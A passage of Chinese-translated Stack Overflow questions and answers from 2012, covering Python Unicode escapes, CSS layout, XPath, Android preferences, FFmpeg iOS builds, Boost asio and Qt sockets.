      mySwingTimer.start();
   }

   private static void createAndShowGui() {
      PausingExecution mainPanel = new PausingExecution();

      JFrame frame = new JFrame("PausingExecution");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

# python - 编写代码时 Python 字符串中的特殊字符

> ID：13061055
> 
> 赞同：1
> 
> 时间：2012-10-25T03:20:37.743
> 
> 标签：python, encoding, python-3.x, special-characters, python-3.2

我的代码中有以下行：

```
if "♠" in text:
    do_something() 
```

工作时没有一些 UTF-16 编码的文本文件。它有效，但看起来有点傻（对我来说）。有没有什么办法可以按照“\code for this character here”的方式写一些东西，以便它适用于以 UTF-16 编码打开的文本数据？另外我如何在正则表达式中使用它？假设我想匹配以 ♠ 或 ♥ 符号开头的每一行。

感谢帮助 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T03:25:56.577

如果你想要一个符号名称，你可以使用`\N{unicode character name}`：

```
'\N{BLACK SPADE SUIT}' 
```

（名称见[http://www.fileformat.info/info/unicode/char/2660/index.htm](http://www.fileformat.info/info/unicode/char/2660/index.htm)）。

# css - 在具有溢出的流体布局中居中浮动 div 或列表项

> ID：13061058
> 
> 赞同：0
> 
> 时间：2012-10-25T03:20:52.500
> 
> 标签：css, css-float, html-lists

我正在创建一个带有浮动列表项的缩略图库，我希望以流畅的布局居中。当它是单行时，我可以毫无问题地做到这一点，但是当它溢出时，它们不再居中。纯粹用css这是不可能的吗？这是一个例子：

```
<style>
#centeredmenu {
   float:left;
   width:100%;
   position:relative;
}
#centeredmenu ul {
   clear:left;
   float:left;
   list-style:none;
   margin:0;
   padding:0;
   position:relative;
   left:50%;
   text-align:center;
}
#centeredmenu ul li {
   display:block;
   float:left;
   list-style:none;
   margin:0;
   padding:0;
   position:relative;
   right:50%;
   width: 200px;
   background-color:black;
   border:1px solid white;
}
</style>
<div id="centeredmenu">
   <ul>
      <li>/</li>
      <li>/</li>
      <li>/</li>
      <li>/</li>
      <li>/</li>
      <li>/</li>
      <li>/</li>
      <li>/</li>
   </ul>
</div> 
```

如果它不能纯粹用css来完成，谁能指出我如何用js来完成它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:08:10.523

**RRcom Rest** y 的回答很好，但是如果您需要在 IE7 上使用它，那么*display: inline-block*将不起作用。

您可以使用此 hack 对 IE7 和现代浏览器获得相同的效果（请参阅“inline-block”之后的额外行）：

```
#centeredmenu ul li {
   display:inline-block;
   *display: inline;
   *zoom: 1;
   margin:0;
   padding:0;
   width: 200px;
   background-color:black;
   border:1px solid white;
} 
```

此 hack 只会被 IE7 解释（带有“*” hack），并且只有在这种情况下才会应用 display: inline 和 zoom: 1 规则。这迫使内联元素具有“布局”。也就是说，您可以分配宽度或高度属性（例如）但在同一行中的内联元素。

[这是解释这个黑客的完整文档](http://www.brunildo.org/test/InlineBlockLayout.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T03:44:35.700

试试这个 css，将 li 从块更改为 inline-block

```
#centeredmenu {

}
#centeredmenu ul {
   list-style:none;
   margin:0;
   padding:0;
   text-align:center;
}
#centeredmenu ul li {
   display:inline-block;
   margin:0;
   padding:0;
   width: 200px;
   background-color:black;
   border:1px solid white;
} 
```

# java - 在未排序的 xml 文件中查找特定值

> ID：13061059
> 
> 赞同：2
> 
> 时间：2012-10-25T03:20:52.323
> 
> 标签：java, xml, parsing, xpath, sax

使用java，我试图找到最近的最高条目号。此条目需要指定特定类型。从那里它需要提取价值。

这是xml的样子

```
<XmlFile>
   <data_item>
        <data_report>
            <type>My_Type</type>
            <entry_number>12</entry_number>                
            <value>1234</value>
        </data_report>
        <data_report>
            <type>My_Type</type>
            <entry_number>9</entry_number>                
            <value>11234</value>
        </data_report>
   </data_item>
   <data_item>
      <data_report>
             <type>My_Type</type>
            <entry_number>17</entry_number>                
            <value>112354</value>
      </data_report>
      <data_report>
             <type>Not_My_Type</type>
            <entry_number>122</entry_number>                
            <value>11234</value>
      </data_report>
   </data_item>
</XmlFile> 
```

所以要点是我需要的数据需要是“My_Type”，它可以在任何 data_item 中，但它需要从 my_type 的所有项目中找到最大间隔，只提取值。

我试过用 Xpath 来做这件事，但我不能让它工作。在这种情况下，第三个数据报告（在第二个数据项中）将是我所追求的，因为它具有最高的条目号，同时是“我的类型”，所以我希望程序为我获取数字 112354。

有没有办法使用 Xpath 做到这一点？我试图让它工作的文件比这大得多，但 Xpath 似乎是最简单的选择，如果它们更适合，我不反对 DOM 或 SAX。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T13:22:05.053

该`max()`功能在 XPath 1.0 中不可用。

**产生想要的（如果有多个节点具有想要的最大属性的第一个）值的纯 XPath 表达式是**：

```
 string(
      /*/*/*[type='My_Type'
           and
             not(/*/*/*[type='My_Type']/entry_number > entry_number)
            ][1]/value
          ) 
```

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output method="text"/>

 <xsl:template match="/">
     <xsl:copy-of select=
     "string(
      /*/*/*[type='My_Type'
           and
             not(/*/*/*[type='My_Type']/entry_number > entry_number)][1]/value
          )"/>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<XmlFile>
    <data_item>
        <data_report>
            <type>My_Type</type>
            <entry_number>12</entry_number>
            <value>1234</value>
        </data_report>
        <data_report>
            <type>My_Type</type>
            <entry_number>9</entry_number>
            <value>11234</value>
        </data_report>
    </data_item>
    <data_item>
        <data_report>
            <type>My_Type</type>
            <entry_number>17</entry_number>
            <value>112354</value>
        </data_report>
        <data_report>
            <type>Not_My_Type</type>
            <entry_number>122</entry_number>
            <value>11234</value>
        </data_report>
    </data_item>
</XmlFile> 
```

**计算 XPath 表达式，并将计算结果复制到输出**：

```
112354 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T03:30:36.367

试试这个 Xpath 表达式。

```
max(//data_item/data_report[type = 'My_Type' and entry_number = max(//data_item/data_report[type = 'My_Type']/entry_number)]/value) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T03:27:58.830

我不知道有任何自动化的方式来做到这一点。我会：
- 解析 xml 以创建 DataReport 对象列表（DOM 可以正常工作）
- 在 DataReport 对象之间创建比较器
- 根据该比较器对列表进行排序

# android - 为什么一个包在自己的清单中声明另一个包的活动？

> ID：13061061
> 
> 赞同：0
> 
> 时间：2012-10-25T03:21:14.183
> 
> 标签：android

如标签所示，这是家庭作业/课堂作业。（请注意，这实际上只是课堂上的事情，我的老师似乎无法解释，所以我转向互联网）。

我们有一个由两个应用程序组成的示例：Sample1 和 Sample2。该示例的重点是显示使用意图从 Sample1 调用 Sample2。示例 2 使用意图过滤器由某个意图启动。这是清单中的一个片段。

```
<activity
    android:name=".Sample2"
    android:label="@string/title_activity_Sample02" >
    <intent-filter>
        <action android:name="Sample02.intent.action.Thinger" />

        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity> 
```

Sample01 使用意图调用它：

```
Intent intent = new Intent("Sample02.intent.action.Thinger");
startActivity(intent); 
```

这工作正常，假设 Sample02 安装在目标设备上。

让我感到困惑的是 Sample01 的清单文件中的这一点：

```
<activity
android:name="com.example.Sample02.Sample02"
>
</activity> 
```

我不明白这是为了什么。除了在同一文件中声明 Sample01 之外，它还存在。据我所知，我可以删除它，一切都一样。有谁知道这是怎么回事？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:42:05.933

这是对 simple01 应用清单中的 simple02 应用的确认。它表明我们想在 simple01 应用程序中使用 simple02 方法和函数。

# php - 使用节点和 PHP 运行的 Mongodb

> ID：13061062
> 
> 赞同：0
> 
> 时间：2012-10-25T03:21:22.077
> 
> 标签：php, node.js, mongodb, xampp

我是 Node.js 和 MongoDB 的新手。我已经成功地让 mongoDB 与 node.js 一起运行，并且能够启动它并将数据存储在集合中。所以服务器已经在 localhost:27017 上运行并且在访问 localhost:28017 时可以工作。

现在我让它在 Node 中运行和工作，我想在我的 Xampp 服务器上用 PHP 测试 MongoDB，但我无法让 phpinfo() 说它正在使用 mongo。
我已按照[此处](https://github.com/mongodb/mongo-php-driver)的步骤配置和安装驱动程序。我已将 mongo.so 文件移动到我的 xampps 扩展中，并在 php.ini 中添加了适当的行 + 重新启动。但是 phpinfo() 仍然没有显示它。

我想我对将 mongo-php-driver 文件夹放在哪里感到困惑？这是否也安装到 Xampp 服务器中，如果是，我将它放在哪里？

它已经在使用 node.js 运行和工作，所以只是对为什么它不能正常工作或无法连接感到困惑。

另外，当我在这里时，是否可以让 php 和 node.js 使用在端口 27017 上运行的同一个 mongoDB 服务器？

编辑：在我将 extension_dir 编辑到正确的路径后，我能够让服务器至少给我一条关于该文件的错误消息

```
extension_lib = "/opt/lampp/lib/php/extensions/no-debug-zts-20090626" 
```

我现在收到此错误

```
Warning: PHP Startup: Unable to load dynamic library '/opt/lampp/lib/php/extensions/no-debug-non-zts-20090626/mongo.so'  - /opt/lampp/lib/php/extensions/no-debug-non-zts-20090626/mongo.so: wrong ELF class: ELFCLASS64 in Unknown on line 0 
```

我想我需要更改 php.ini 选项以使其正确加载。但似乎我编译了错误的 mongo.so 构建。我再试试。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:23:29.997

据此： http: [//montenasoft.com/en/blog/how-install-pecl-php-extension-64bit-linux-while-you-are-using-32bit-xampp](http://montenasoft.com/en/blog/how-install-pecl-php-extension-64bit-linux-while-you-are-using-32bit-xampp)

因为xampp是用32位编译的，但是你编译的mongo驱动是64位的。您可能必须使用以下命令编译您的 mongo 驱动程序：

```
phpize
CFLAGS=-m32 CPPFLAGS=-m32 CCASFLAGS=-m32 ./configure
make
sudo make install 
```

或者只是单独安装apache2、mysql、php。我认为这是一个更好的选择。

# c++ - 提升异步套接字和 boost::thread

> ID：13061063
> 
> 赞同：3
> 
> 时间：2012-10-25T03:21:58.637
> 
> 标签：c++, boost-asio, boost-thread

我正在编写 TCP 客户端，它应该能够同时发送和接收数据。你能告诉我应该如何调用`async_send`并且`async_receive`是单独的线程吗？

换句话说，如何调用

```
m_Socket.async_send(boost::asio::buffer(txBuf.c_str(), txBuf.length()+1),
    boost::bind(&TCPClient::sendingHandler, this, boost::asio::placeholders::error));

m_Socket.async_receive(boost::asio::buffer(rxBuf, maxBufLen),
    boost::bind(&TCPClient::sendingHandler, this, boost::asio::placeholders::error)); 
```

在

```
boost::thread receivingThread(boost::bind(...));
boost::thread sendingThread(boost::bind(...)); 
```

如果我在处理程序中调用`async_send` 或`async_receive`再次调用它会正常工作吗？我需要一个不定式循环来发送/接收数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:57:26.690

主要思想是——在递归里面发送和接收`TCPClient::sendingHandler/receivingHandler`2 `io_service's`．这`io_service's`在 2 个线程内被调用 -

```
boost::thread receivingThread(boost::bind(...));
boost::thread sendingThread(boost::bind(...)); 
```

[这个想法在本教程](http://www.boost.org/doc/libs/1_51_0/doc/html/boost_asio/example/echo/async_tcp_echo_server.cpp)中很明显。您必须调用和使用 2 个单独的唯一区别`io_service's`。

另一种选择是 1`io_service`和多个线程调用`io_service::run`。但是你必须使用`boost::asio::strand`远线程安全：

```
boost::asio::strand* _strand = new boost::asio::strand(io);
//then use it in handlers
boost::asio::async_read(*socket, 
                    boost::asio::buffer(msg.data(), result.size),
                    (*_strand).wrap(
                    boost::bind(&ConnectionInterface::parsePacket, shared_from_this(), boost::asio::placeholders::error))); 
```

# vb.net - 向下滚动注释查看器

> ID：13061078
> 
> 赞同：0
> 
> 时间：2012-10-25T03:23:59.480
> 
> 标签：vb.net, scrollbar, mkannotationview

你能在 VB.Net 中帮我解决这个问题吗？当我按下“Ctrl + Down”时，我试图在这里为我的 AnnotateViewer 设置一个快捷方式，视图必须向下滚动。

这是我尝试过的代码

```
Dim pt As Point = iView.ScrollPosition
    If e.Control And e.KeyCode = Keys.NumPad0 Then
      pt.Y -= 99999
      Msg("Scroll Down")
    End If 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T06:27:11.940

是的，现在它可以工作了。我使用了这些代码

```
 If e.Control And e.KeyCode = Keys.NumPad2 Then
        iView.ScrollPosition += New Point(0, -90)
    ElseIf e.Control And e.KeyCode = Keys.NumPad8 Then
        iView.ScrollPosition += New Point(0, 90)
    ElseIf e.Control And e.KeyCode = Keys.NumPad4 Then
        iView.ScrollPosition += New Point(50, 0)
    ElseIf e.Control And e.KeyCode = Keys.NumPad6 Then
        iView.ScrollPosition += New Point(-50, 0)

    End If 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:47:57.467

iView.ScrollPosition = 新点(x,y)

更改水平滚动的 x 值和垂直滚动条的 y 值。

# c++ - QLocalSocket 到 QLocalServer 的消息在传输过程中被损坏

> ID：13061079
> 
> 赞同：1
> 
> 时间：2012-10-25T03:24:07.083
> 
> 标签：c++, qt, sockets, character-encoding, qlocalsocket

我还没有找到类似的问题，所以这里是：

我正在跨两个应用程序将 QString 从 QLocalSocket 发送到 QLocalServer 。接收（QLocalServer）应用程序确实收到了消息，但似乎编码完全错误。

如果我从 QLocalSocket（客户端）发送一个 QString = "x"，我会在 QLocalServer 中得到一个外国（中文？）符号。我的代码实际上是从[诺基亚开发者网站复制而来的](http://www.developer.nokia.com/Community/Wiki/File%3aLocalSocketIPC.zip)

如果我通过 QDebug 打印出消息，我会得到“??”。如果我在消息框中触发它，则会打印中文字符。我尝试将收到的消息重新编码为 UTF-8、Latin1 等，但没有成功。

代码如下：

```
//Client
int main(int argc, char *argv[])
{
QLocalSocket * m_socket = new QLocalSocket();
m_socket->connectToServer("SomeServer");

if(m_socket->waitForConnected(1000))
{
    //send a message to the server
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_4_7);
    out << "x";
    out.device()->seek(0);
    m_socket->write(block);
    m_socket->flush();
    QMessageBox box;
    box.setText("mesage has been sent");
    box.exec();
...
}

//Server - this is within a QMainWindow
void MainWindow::messageReceived()
{
QLocalSocket *clientConnection = m_pServer->nextPendingConnection();

while (clientConnection->bytesAvailable() < (int)sizeof(quint32))
    clientConnection->waitForReadyRead();

connect(clientConnection, SIGNAL(disconnected()),
        clientConnection, SLOT(deleteLater()));

QDataStream in(clientConnection);
in.setVersion(QDataStream::Qt_4_7);
if (clientConnection->bytesAvailable() < (int)sizeof(quint16)) {
    return;
}

QString message;
in >> message;

QMessageBox box;
box.setText(QString(message));
box.exec();
} 
```

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:35:19.050

客户端正在序列化，`const char*`而服务器正在反序列化`QString`. 这些不兼容。前者从字面上写入字符串字节，后者首先编码为 UTF-16。所以，我猜在服务器端，原始字符串数据“fff”被解码为 QString，就好像它是 UTF-16 数据一样......可能导致字符 U+6666，晦涩。

尝试改变客户端也序列化一个QString，即

```
// client writes a QString
out << QString::fromLatin1("fff");

// server reads a QString
QString message;
in >> message; 
```

# php - 大型对象/数组转储的视图界面

> ID：13061081
> 
> 赞同：0
> 
> 时间：2012-10-25T03:24:20.483
> 
> 标签：php, debugging, interface

我想在页面中嵌入我的模型对象的详细结构报告，例如 print_r() 或 var_export() 生成（现在我正在通过在 get_object_vars() 上运行 var_export() 来执行此操作）。但我真正想看到的只是一些属性（在大多数情况下），但此时我必须使用 Ctrl+F 并寻找我想要的变量，而不是在页面完成加载后立即盯着它。所以我正在嵌入按钮来显示/隐藏大型数组等，但我想：“如果我现在已经做的事情怎么办？” 那么有吗？

更新：

> 你理想的界面是什么样的？

首先，倾倒的模型适合第一个屏幕。第一眼就能看到所有属性（数量不多，每个10个左右，一共三个模型，所以有可能）。小阵列也可以展开显示。让将其计为“小”的数组的大小是可定义的。理想情况下，用户无需单击、滚动屏幕或键入内容即可查看属性值。

表示值必须有一些改进，例如，如果数组为空，则显示

```
array ‘My_big_array’ is empty 
```

`is_`如果一个以, `has_`,开头的布尔变量`had_`的值为 false，则使变量（让我们举个`is_available`例子）显示为

```
is_NOT_available 
```

红色，如果值为 true，则显示

```
is_available 
```

在绿色。没有显示任何值。定义的常量也是如此。那将是理想的。我想把重点放在这种开关上。

Krumo 似乎很有用，但由于它总是关闭变量而不影响它有多大，我不能按原样使用它，但很快就会在 github 上出现类似的东西:)

第二次更新从这里开始：

> 任何看到is_available = false的程序员都会知道是什么意思，无需多做

引入颜色指示我忘记了一件事：“开关”让我们这样称呼它们，我是否重要。所以我现在有一些会以绿色或红色显示，这是针对全局的，比如缓存，显示为

```
Caching is… ON 
```

'ON' 用绿色写，（禁用时'OFF' 用红色写），而关于它是什么的文字，即“缓存是……”用黑色写成。

还有一些不那么重要的，比如我没有定义

```
REVEAL_TIES is… not set 
```

“未设置”用灰色书写，而描述它的文字则保持黑色。如果它被设置，整个短语将是黑色的，因为没有什么重要的：如果这个用于显示一些秘密事物的小实用程序正在运行，我会在它之后看到一些消息，如果它不是 - 站点将独立运行其状态。

将开关划分为重要的而不是相应的颜色匹配应该可以提高可读性，特别是对于那些不是程序员并且只是启用调试模式的用户，因为来自 bugzilla 的一些人说这样做 - 对他们来说，这将有助于理解什么是重要的，什么是重要的不是。

非常感谢所有回复的人。

# iphone - 为 iOS6.0 ARMv7 处理器构建 FFMPEG 库

> ID：13061086
> 
> 赞同：13
> 
> 时间：2012-10-25T03:24:49.167
> 
> 标签：iphone, gcc, ffmpeg, ios6, armv7

**警告：**

另一位用户刚刚告知我，在 iOS 上使用 FFMPEG 存在一些法律问题，将链接留在这里[http://multinc.com/2009/08/24/compatibility-between-the-iphone-app-store-和-lgpl/](http://multinc.com/2009/08/24/compatibility-between-the-iphone-app-store-and-the-lgpl/)

我稍微整理了一下我的问题，当我第一次写它时，我很慌张。现在我可以在稍作休息后更清楚。

> 编辑：了解到您必须为 ARMv7、ARMv7s 和 iOS6.0 构建

我正在尝试在 XCode 4.5.1 项目中使用 FFMPEG 库。我正在尝试为 ARMv7 构建它。我正在寻找的是确切的过程和一些解释。我知道这不是一个有据可查的问题。但我知道其他人也有和我一样的问题。

**我已经能够做到的。**

我已经能够构建用于测试的库。

1）我已经能够克隆ffmpeg。对于初学者，这将通过使用 ffmpeg 源创建目录来帮助您入门。（向写这篇文章的人致敬）

> git clone git://source.ffmpeg.org/ffmpeg.git ffmpeg

2）我已经能够编写一个没有任何错误的配置文件。我们稍后会回到这部分。这是我附加到 ./configure 的命令

> ./configure --disable-doc --disable-ffmpeg --disable-ffplay --disable-ffserver --enable-cross-compile --arch=arm --target-os=darwin --cc=/Applications/Xcode .app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/llvm-gcc-4.2/bin/arm-apple-darwin10-llvm-gcc-4.2
> 
> --as='gas-preprocessor/gas-preprocessor.pl /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/llvm-gcc-4.2/bin/arm-apple-darwin10-llvm -gcc-4.2'
> 
> --sysroot=/applications/xcode.app/contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk
> 
> --cpu=cortex-a8 --extra-ldflags='-arch=armv7 -isysroot /applications/xcode.app/contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk' --enable -pic --disable-bzlib --disable-gpl --disable-shared --enable-static --disable-mmx --disable-debug --disable-neon --extra-cflags='-pipe -Os -gdwarf -2 -isysroot /applications/xcode.app/contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS5.1.sdk -m${thumb_opt:-no-thumb} -mthumb-interwork'

这些是需要注意的一些事项。

*   我必须下载（[https://github.com/yuvi/gas-preprocessor](https://github.com/yuvi/gas-preprocessor)）将文件 gas-preprocessor.pl 复制到 /usr/local/bin。设置读写权限 (777)
*   确保我使用的是正确的 GCC 编译器：/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/llvm-gcc-4.2/bin/arm-apple-darwin10-llvm-gcc- 4.2
*   确保我使用的是正确的 SDK：/applications/xcode.app/contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk
*   --extra-cflags="-arch armv7" 原因：错误：无法识别的命令行选项“-arch”</li>

**问题就在这里。**

我可以像这样包含图书馆

> libavcodec/avcodec.h

但是当我开始编写编码器时。我收到了这个警告，还有无数错误。

> 忽略文件/Users/Jimmy/Development/source.ffmpeg/Library/libavutil.a，文件是为存档而构建的，它不是被链接的架构（armv7s）：/Users/Jimmy/Development/source.ffmpeg/Library/libavutil。一个

这意味着我没有构建正确的二进制文件。

**我正在寻找的是一个以前做过的人，带领我们所有人完成为 iOS6.0 和 ARMv7 构建 FFMPEG 的过程以及大部分需要注意的事情。**万分感谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-26T04:16:51.263

这是我在 iOS 6 上进行交叉编译的工作配置，`FFmpeg`拱门是`ARMv7`

**注意：你必须有[gas-preprocessor.pl](https://github.com/yuvi/gas-preprocessor)在你的 bin 目录中有[gas-preprocessor.pl](https://github.com/yuvi/gas-preprocessor)`/usr/local/bin/`之前请不要继续**

*   [从这里](https://ffmpeg.org/download.html)下载 FFmpeg 1.0 “天使”

*   解压缩并将其放在某个地方，即您的`Desktop`文件夹

*   打开终端并浏览到`unzipped FFmpeg folder`

*   复制并粘贴以下命令，（**请耐心等待**）

> ./configure --disable-doc --disable-ffmpeg --disable-ffplay --disable-ffserver --enable-cross-compile --arch=arm --target-os=darwin --cc=/Applications/Xcode .app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/gcc --as='gas-preprocessor/gas-preprocessor.pl /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform /Developer/usr/bin/gcc' --sysroot=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk --cpu=cortex-a8 --extra- cflags='-arch armv7' --extra-ldflags='-arch armv7 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk' --enable- pic --enable-decoder=rawvideo --disable-asm

*   现在在终端上输入以下命令`make`（**稍等**）

*   一旦完成，现在在终端上输入`sudo make install`（**再次等待**）

*   去`/usr/local/lib`寻找你刚出炉的`armv7`库

*   享受！

亚历克斯

* * *

# 添加了对 armv7s 的支持

**这个 armv7s 配置完全未经测试，我真的不知道这是否可行，我没有 iPhone 5，所以我们需要有人来测试最终的 armv7s 库**

> ./configure --disable-doc --disable-ffmpeg --disable-ffplay --disable-ffserver --enable-cross-compile --arch=arm --target-os=darwin --cc=/Applications/Xcode .app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/gcc --as='gas-preprocessor/gas-preprocessor.pl /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform /Developer/usr/bin/gcc' --sysroot=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk --cpu=cortex-a8 --extra- cflags='-arch armv7s' --extra-ldflags='-arch armv7s -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.0.sdk' --enable- pic --enable-decoder=rawvideo --disable-asm

# python - 使用 Python 和 lxml.html 解析 Html

> ID：13061087
> 
> 赞同：3
> 
> 时间：2012-10-25T03:25:11.880
> 
> 标签：python, parsing, screen-scraping, lxml

我正在 scraperwiki.com 创建一个 Python 刮板。我需要解析包含以下代码的 html 页面的一部分：

```
<div class="div_class">
    <h3>I'm a title. Don't touch me</h3>
    <ul>
        <li>
        I'm a title. Parse me
            <ul>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
            </ul>
        </li>
        <li>
        I'm a title. Parse me
        <ul>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
            </ul>
        </li>
        <li>
        I'm a title. Parse me
        <ul>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
            </ul>
        </li>
        <li>
        I'm a title. Parse me
        <ul>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
                <li>fdfdsfd</li>
            </ul>
        </li>
    </ul>
</div> 
```

我只想解析“我是一个标题。解析我”标题。这是我的做法：

```
import scraperwiki
import lxml.html
import re 
import datetime
#.......................
raw_string = lxml.html.fromstring(scraperwiki.scrape(url_to_scrape))
raw_html = raw_string.cssselect("div.div_class ul > li")
for item in ras_html
  print(item.text_content()) 
```

我确实工作。但它捕获了 ul 中的**所有数据。**我不想要它，我只想在每个 ul 中找到“我是一个标题。解析我”，就是这样。

我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T03:56:43.680

的美妙之`lxml`处在于您可以同时使用 css 选择器和 xpath 来查找页面上的任何元素。

在您的情况下，由于您有嵌套`<ul>`列表，因此最好使用 xpath 进行导航：

```
# find every <li> in the <ul> under div with class div_class
raw_html = raw_string.xpath("//div[@class='div_class']/ul/li")
for item in raw_html:
    print(item.text.strip()) 
```

印刷：

```
I'm a title. Parse me
I'm a title. Parse me
I'm a title. Parse me
I'm a title. Parse me 
```

以下是lxml中xpath的简要说明：http: [//lxml.de/tutorial.html#using-xpath-to-find-text](http://lxml.de/tutorial.html#using-xpath-to-find-text)

# android - SharedPreference 不重新创建菜单

> ID：13061090
> 
> 赞同：0
> 
> 时间：2012-10-25T03:25:55.397
> 
> 标签：android, sharedpreferences

我正在尝试使用 SharedPreferences 来存储首选项，然后根据 SharedPreference 更改菜单项的默认选中状态。但它似乎不起作用。菜单选项会一直保留到应用程序关闭。当我重新加载应用程序时，该设置恢复为默认设置，而不是新的 SharedPreference 设置。

```
public class MainActivity extends Activity {

boolean prefs = true;
String FILENAME = "settings";
String string;

public static final String LOG_TAG = "dbryant423";
public static final String PREFS_NAME = "settings";

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    Log.v(LOG_TAG, "prefs value: " +prefs);

 }

public boolean onCreateOptionsMenu(Menu menu) {

    getMenuInflater().inflate(R.menu.menu, menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    String preference = settings.getString("preference", string);
    if (preference == "us")
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference == "metric")
        menu.findItem(R.id.menu_metric).setChecked(true);
    return true; 
}

// called when an item is selected
@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch(item.getItemId()) { // decide which MenuItem was pressed based on it's id
    case R.id.menu_us:
            menuUS();

    case R.id.menu_metric:
            menuMetric();

    }
    return true;
}

@Override
public boolean onPrepareOptionsMenu(Menu menu) {
    super.onPrepareOptionsMenu(menu);
    if (prefs == true)
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (prefs == false)
        menu.findItem(R.id.menu_metric).setChecked(true);
    return true;
}

public void menuUS() {
    prefs = true;
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString("preference", "us");
    editor.commit();
}

public void menuMetric() {
    prefs = false;
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString("preference", "metric");
    editor.commit();
}

public void calculateCylinder(View v) {
    Intent calculateCylinderUS = new Intent(this, CalculateCylinder.class);
    Intent calculateCylinderMetric = new Intent(this, CalculateCylinderMetric.class);
     Log.v(LOG_TAG, "prefs value: " +prefs);
    if (prefs == true)
        startActivity(calculateCylinderUS);
    else if (prefs == false)
        startActivity(calculateCylinderMetric);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T16:39:02.927

我从两个答案中都使用了一点，我自己也发现了一些缺失的部分。我发现的主要问题之一是我没有“休息”；在我的 switch 语句中，无论我选择哪一种，它都在运行这两种情况。另一个最终修复是而不是调用

```
public boolean onCreateOptionsMenu(Menu menu) {

    getMenuInflater().inflate(R.menu.menu, menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    String preference = settings.getString("preference", string);
    if (preference.equals("us"))
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference.equals("metric"))
        menu.findItem(R.id.menu_metric).setChecked(true);
    return true; 

} 
```

在我的 if/else if 语句试图修改 setChecked 属性时，我意识到我需要做的就是在 onCreateOptionsMenu 中修改“prefs”的值。像这样：

```
public boolean onCreateOptionsMenu(Menu menu) {

    getMenuInflater().inflate(R.menu.menu, menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    String preference = settings.getString("preference", string);
    if (preference.equals("us"))
        prefs = true;
    else if (preference.equals("metric"))
        prefs = false;
    return true; 

} 
```

onPrepareOptionsMenu 仍然需要“setChecked”才能切换已选择的选项。这是更新的工作代码：

```
public class MainActivity extends Activity {

boolean prefs = true;
String FILENAME = "settings";
String string;

public static final String LOG_TAG = "dbryant423";
public static final String PREFS_NAME = "settings";

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    Log.v(LOG_TAG, "prefs value onCreate: " +prefs);

 }

public boolean onCreateOptionsMenu(Menu menu) {

